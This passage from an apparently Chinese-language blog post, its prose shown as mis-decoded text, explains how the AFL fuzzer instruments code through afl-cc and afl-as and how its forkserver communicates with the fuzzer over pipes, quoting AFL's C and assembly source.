argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  find_as(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line"></span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SAYF</code>å°±æ˜¯<code>fprintf</code>å‡½æ•°ï¼Œæ£€æµ‹åˆ°å‚æ•°å°äº2çš„æ—¶å€™æŠ¥é”™å¹¶é€€å‡º</p><ul><li>ä½¿ç”¨<code>find_as</code>è¿›è¡Œå‚æ•°çš„è§£æåˆ°è‡ªèº«ç¨‹åºè·¯å¾„ï¼Œæ‰¾åˆ°<code>afl-as</code>çš„aflæ±‡ç¼–å™¨</li><li><code>edit_params</code>ä¸­ï¼Œè§£æå‚æ•°ï¼Œè®¾ç½®è‡ªç”Ÿå¯¹åº”çš„ç¼–è¯‘å™¨ï¼Œè·å¾—å’Œè®¾ç½®ä¸€ç³»åˆ—ç¯å¢ƒå˜é‡ï¼Œæœ€åå¾—åˆ°çš„<code>cc_params</code>å°±æ˜¯ç¼–è¯‘å‚æ•°</li><li><code> execvp(cc_params[0], (char**)cc_params);</code>ï¼Œé€šè¿‡å‰é¢æ‰¾åˆ°çš„æ±‡ç¼–å™¨<code>as_path</code>å’Œå‚æ•°åˆ›å»ºè¿›ç¨‹è¿›è¡Œæ’æ¡©ç¼–è¯‘ã€‚ï¼ˆå…·ä½“å°±æ˜¯æ›¿æ¢äº†ç¨‹åºåç§°ä¹‹ç±»çš„ï¼Œæºç å¾ˆç®€å•ï¼‰</li></ul><h3 id="afl-as"><a class="markdownIt-Anchor" href="#afl-as"></a> afl-as</h3><p><strong>main</strong></p><p>è¿›å…¥mainåˆ›å»ºäº†ä¸€äº›åˆ—å˜é‡ç„¶åå°±æ˜¯åœ¨<code>a</code> ä¸­å°† <code>cc_params</code> è½¬ä¸º<code>as_params</code></p><p><strong>add_instrumentation</strong></p><p>é‡å¤´å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">0</span>;</span><br><span class="line">      ins_lines++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼ŒAFLçš„ä»£ç æ’æ¡©ï¼Œå°±æ˜¯åœ¨å°†æºæ–‡ä»¶ç¼–è¯‘ä¸ºæ±‡ç¼–ä»£ç åï¼Œé€šè¿‡<code>afl-as</code>å®Œæˆã€‚å¼€å§‹é‡å†™æ±‡ç¼–æŒ‡ä»¤ï¼Œå‡†å¤‡åœ¨åˆ†æ”¯å¤„æ’å…¥ä»£ç </p><p>å…ˆçœ‹çœ‹32ä½ï¼Œ64ä½å’Œè¿™ä¸ªä¹Ÿå·®ä¸å¤š</p><p><code>trampoline_fmt_32</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">static const u8* trampoline_fmt_32 =</span><br><span class="line"></span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.align 4\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;leal -16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;movl %%edi,  0(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%edx,  4(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%ecx,  8(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%eax, 12(%%esp)\n&quot;</span><br><span class="line">  &quot;movl $0x%08x, %%ecx\n&quot;</span><br><span class="line">  &quot;call __afl_maybe_log\n&quot;</span><br><span class="line">  &quot;movl 12(%%esp), %%eax\n&quot;</span><br><span class="line">  &quot;movl  8(%%esp), %%ecx\n&quot;</span><br><span class="line">  &quot;movl  4(%%esp), %%edx\n&quot;</span><br><span class="line">  &quot;movl  0(%%esp), %%edi\n&quot;</span><br><span class="line">  &quot;leal 16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- END --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æ±‡ç¼–ï¼Œå¬chatGPTè¯´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    lea esp, [esp-16]      ; leal -16(%esp), %esp</span><br><span class="line">    mov [esp], edi         ; movl %edi, 0(%esp)</span><br><span class="line">    mov [esp+4], edx       ; movl %edx, 4(%esp)</span><br><span class="line">    mov [esp+8], ecx       ; movl %ecx, 8(%esp)</span><br><span class="line">    mov [esp+12], eax      ; movl %eax, 12(%esp)</span><br><span class="line">    mov ecx, 0x08000000    ; movl $0x%08x, %ecx</span><br><span class="line">    call __afl_maybe_log   ; call __afl_maybe_log</span><br><span class="line">    mov eax, [esp+12]      ; movl 12(%esp), %eax</span><br><span class="line">    mov ecx, [esp+8]       ; movl 8(%esp), %ecx</span><br><span class="line">    mov edx, [esp+4]       ; movl 4(%esp), %edx</span><br><span class="line">    mov edi, [esp]         ; movl 0(%esp), %edi</span><br><span class="line">    lea esp, [esp+16]      ; leal 16(%esp), %esp</span><br></pre></td></tr></table></figure><p>32ä½æ˜¯ç»å…¸çš„æ ˆä¼ å‚ï¼Œè¿™é‡Œä½¿ç”¨å¯¹espçš„ç§»åŠ¨å®ç°äº†ä»<code>edi</code> <code>edx</code> <code>ecx</code> <code>eax</code>çš„ä¿å­˜ï¼Œç„¶ååˆå°†<code>ecx</code>è®¾ç½®ä¸ºäº†0x08000000ï¼Œè¿™ä¸ªæ˜¯chatGPTç¿»è¯‘é”™äº†ï¼Œæ­£ç¡®çš„ç†è§£æ˜¯&quot;%08x&quot; æ˜¯æ ¼å¼è¯´æ˜ç¬¦ï¼Œç”¨äºå°†ä¸€ä¸ªæ•´æ•°æ ¼å¼åŒ–ä¸ºä¸€ä¸ªå¸¦æœ‰å‰å¯¼é›¶çš„ 8 ä½åå…­è¿›åˆ¶æ•°ã€‚ä¾‹å¦‚ï¼Œâ€œ%08xâ€ å°†æŠŠæ•°å­— 10 æ ¼å¼åŒ–ä¸º â€œ0000000Aâ€ã€‚è¿™æ®µæ±‡ç¼–ä»ç„¶æ˜¯å±äºCè¯­è¨€çš„èŒƒç•´ã€‚</p><p>ä¼¼ä¹æˆ‘ä»¬ä¸‹ä¸€æ­¥è¦çœ‹çš„æ˜¯<code>__afl_maybe_log</code>ï¼Œ**ä½†æ˜¯ä½ å°±æ²¡æƒ³è¿‡R(MAP_SIZE)**æœ‰ä»€ä¹ˆç”¨å—ï¼Ÿ<code>R(x)</code>çš„å®šä¹‰æ˜¯<code>(random() % (x))</code>ï¼Œæ‰€ä»¥<code>R(MAP_SIZE)</code>å³ä¸º0åˆ°MAP_SIZEä¹‹é—´çš„ä¸€ä¸ªéšæœºæ•°ã€‚</p><p>å› æ­¤ï¼Œåœ¨å¤„ç†åˆ°æŸä¸ªåˆ†æ”¯ï¼Œéœ€è¦æ’å…¥æ¡©ä»£ç æ—¶ï¼Œ<code>afl-as</code>ä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºè¿è¡Œæ—¶ä¿å­˜åœ¨<code>ecx</code>ä¸­çš„å€¼ã€‚è€Œè¿™ä¸ªéšæœºæ•°ï¼Œä¾¿æ˜¯ç”¨äºæ ‡è¯†è¿™ä¸ªä»£ç å—çš„keyã€‚</p><p>æ¥ä¸‹æ¥æ¥åˆ°<code>__afl_maybe_log</code></p><h2 id="è¿è¡Œ"><a class="markdownIt-Anchor" href="#è¿è¡Œ"></a> è¿è¡Œ</h2><p>å¼€å§‹fuzzï¼Œé‚£ä¹ˆaflå¦‚ä½•å¯åŠ¨è¿™ä¸ªç¨‹åºï¼Œå¯ä»¥çœ‹çœ‹<code>afl-fuzz.c</code>ï¼Œä¸è¿‡æœ€å¼€å§‹åä¸–è®¾ç½®å‚æ•°ï¼Œè¿™é‡Œå°†é‡è¦ç‚¹çš„éƒ¨åˆ†ã€‚</p><p>è°ƒç”¨çš„é“¾æ¡æœ‰ç‚¹å¤æ‚é¦–å…ˆåœ¨L8044</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skipped_fuzz = fuzz_one(use_argv);</span><br></pre></td></tr></table></figure><p>ç„¶åçš„<code>fuzz_one</code>ä¸­ï¼Œä½¿ç”¨é˜Ÿåˆ—<code>queue_cur</code>æ¥ç®¡ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>åœ¨<code>calibrate_case</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode != <span class="number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">  init_forkserver(argv);</span><br></pre></td></tr></table></figure><p>æ€»ç®—æ˜¯æ‰¾åˆ°äº†</p><blockquote><p>ä¸ºäº†æ›´é«˜æ•ˆåœ°è¿›è¡Œä¸Šè¿°è¿‡ç¨‹ï¼ŒAFLå®ç°äº†ä¸€å¥—fork serveræœºåˆ¶ã€‚å…¶åŸºæœ¬æ€è·¯æ˜¯ï¼šå¯åŠ¨targetè¿›ç¨‹åï¼Œtargetä¼šè¿è¡Œä¸€ä¸ªfork serverï¼›fuzzerå¹¶ä¸è´Ÿè´£forkå­è¿›ç¨‹ï¼Œè€Œæ˜¯ä¸è¿™ä¸ªfork serveré€šä¿¡ï¼Œå¹¶ç”±fork serveræ¥å®ŒæˆforkåŠç»§ç»­æ‰§è¡Œç›®æ ‡çš„æ“ä½œã€‚è¿™æ ·è®¾è®¡çš„æœ€å¤§å¥½å¤„ï¼Œå°±æ˜¯ä¸éœ€è¦è°ƒç”¨<code>execve()</code>ï¼Œä»è€ŒèŠ‚çœäº†è½½å…¥ç›®æ ‡æ–‡ä»¶å’Œåº“ã€è§£æç¬¦å·åœ°å€ç­‰é‡å¤æ€§å·¥ä½œ</p></blockquote><p>L1987</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>];</span><br><span class="line">....</span><br><span class="line">forksrv_pid = fork();</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨pipeå’Œforkserverè¿›è¡Œé€šè®¯</p><p>L2088çš„ä½ç½®å¼€å§‹æ‰§è¡Œ<code>execv(target_path, argv);</code>ã€‚å…¶å®çœ‹åˆ°è¿™é‡Œæˆ‘ä¹Ÿå¾ˆç–‘æƒ‘ä¸Šé¢çš„è§£é‡Š</p><p>åœ¨L2103ä¸­æµ‹è¯•å’Œforkserverçš„é€šè®¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];</span><br><span class="line">    fsrv_st_fd  = st_pipe[<span class="number">0</span>];</span><br><span class="line">    rlen = read(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line">...</span><br><span class="line">  <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    OKF(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;    </span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çš„fork serveræ˜¯å¦‚ä½•ä¸fuzzeré€šä¿¡æ˜¯é¢è¯•è€ƒç‚¹ï¼ˆ/dogeï¼‰</p><h3 id="forkserver"><a class="markdownIt-Anchor" href="#forkserver"></a> forkserver</h3><p>çŸ¥é“åˆ›å®‡ä¸çŸ¥é“æ˜¯è®²çš„å¤ªç¢äº†è¿˜æ˜¯æˆ‘ç†è§£æœ‰é—®é¢˜ï¼Œåœ¨è¿™é‡Œæˆ‘å°±ä¸æ€ä¹ˆè¿½çš„äº†ä»£ç äº†ï¼Œä¸è¿‡æƒ³èµ·å¼€å§‹è¯´è¿‡çš„ï¼š<strong>fuzzerå¹¶ä¸è´Ÿè´£forkå­è¿›ç¨‹ï¼Œè€Œæ˜¯ä¸è¿™ä¸ªfork serveré€šä¿¡ï¼Œå¹¶ç”±fork serveræ¥å®ŒæˆforkåŠç»§ç»­æ‰§è¡Œç›®æ ‡çš„æ“ä½œ</strong>ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å’Œæ’è¿›å»çš„<code>__afl_maybe_log</code>ä¸€æ ·æ˜¯æ’å…¥å…¥è¿›å»äº†ä¸€ä¸ª<code>forkserver</code>åœ¨ä»£ç å½“ä¸­ï¼Œé‚£ä¹ˆå›åˆ°<code>afl-as</code>ï¼ŒL446</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ins_lines)</span><br><span class="line">  <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br></pre></td></tr></table></figure><p>ä¾ç„¶ä»¥32ä½ä¸¾ä¾‹å­<code>main_payload_32</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_forkserver:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Enter the fork server mode to avoid the overhead of execve() calls. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Phone home and tell the parent that we&#x27;re OK. (Note that signals with\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     no SA_RESTART will mess it up). If this fails, assume that the fd is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     closed because we were execve()d from an instrumented binary, or because\n&quot;</span> </span><br><span class="line">  <span class="string">&quot;     the parent doesn&#x27;t want to use the fork server. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $4          /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_temp /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;  /* file desc */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  write\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpl  $4, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne   __afl_fork_resume\n&quot;</span></span><br></pre></td></tr></table></figure><p>çœ‹æ³¨é‡Šä¹Ÿçœ‹çš„æ˜ç™½äº†ï¼Œç»™fuzzerè¯´å·²ç»å‡†å¤‡å®Œæ¯•ï¼Œå…¶ä¸­<code>$__afl_temp</code>å°±æ˜¯å››å­—èŠ‚é•¿åº¦çš„éªŒè¯ä¿¡æ¯ï¼Œç„¶åå¼€å§‹ç­‰å¾…å¾ªç¯ï¼Œè¯»å–å‘½ä»¤ç®¡é“ï¼Œç›´åˆ°fuzzeré€šçŸ¥å…¶å¼€å§‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_fork_wait_loop:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Wait for parent by reading from the pipe. Abort if read fails. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushl $4          /* length    */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushl $__afl_temp /* data      */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushl $&quot;</span> STRINGIFY(FORKSRV_FD) <span class="string">&quot;        /* file desc */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  call  read\n&quot;</span></span><br><span class="line"><span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  cmpl  $4, %eax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jne   __afl_die\n&quot;</span>      </span><br></pre></td></tr></table></figure><p>æœ‰é”™è¯¯å°±å¯„<code>__afl_die</code>ï¼Œé‚£ä¹ˆæˆåŠŸçš„è¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;  /* Once woken up, create a clone of our process. This is an excellent use\n&quot;</span></span><br><span class="line"><span class="string">&quot;     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n&quot;</span></span><br><span class="line"><span class="string">&quot;     caches getpid() results and offers no way to update the value, breaking\n&quot;</span></span><br><span class="line"><span class="string">&quot;     abort(), raise(), and a bunch of other things :-( */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  call fork\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  cmpl $0, %eax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jl   __afl_die\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je   __afl_fork_resume\n&quot;</span>        </span><br></pre></td></tr></table></figure><p>å¾—åˆ°çˆ¶å­è¿›ç¨‹çš„IDï¼Œå¯¹å¾…å­è¿›ç¨‹èµ°åˆ°<code>__afl_fork_resume</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_fork_resume:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* In child process: close fds, resume execution. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY(FORKSRV_FD) <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  close\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  close\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $8, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popl %edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popl %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp  __afl_store\n&quot;</span></span><br></pre></td></tr></table></figure><p>å¯¹äºå¤§äº0çš„è¿”å›å€¼ï¼ˆå³çˆ¶è¿›ç¨‹ï¼‰ä»–ç»§ç»­è¿è¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;  /* In parent process: write PID to pipe, then wait for child. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movl  %eax, __afl_fork_pid\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $4              /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_fork_pid /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;      /* file desc */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  write\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $0             /* no flags  */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_temp    /* status    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl __afl_fork_pid /* PID       */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  waitpid\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpl  $0, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jle   __afl_die\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Relay wait status to pipe, then loop back. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $4          /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_temp /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;  /* file desc */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  write\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp __afl_fork_wait_loop\n&quot;</span>    </span><br></pre></td></tr></table></figure><p>ç»§ç»­è¿›è¡Œforkserverçš„ç®¡é“é€šè®¯ï¼Œç„¶å<code>__afl_fork_wait_loop</code>ï¼Œ</p><h3 id="fuzzer"><a class="markdownIt-Anchor" href="#fuzzer"></a> fuzzer</h3><p>å›é¡¾ä¸€ä¸‹ç›®å‰â€œæ ˆâ€çš„æƒ…å†µï¼š<code>main</code> -&gt; <code>calibrate_case</code> -&gt; <code>init_forkserver</code></p><p><img src="https://img.joe1sn.top/uploads/big/0d62f5f1741495588a352bb92afabe74.png" alt="image-20230722112212761" 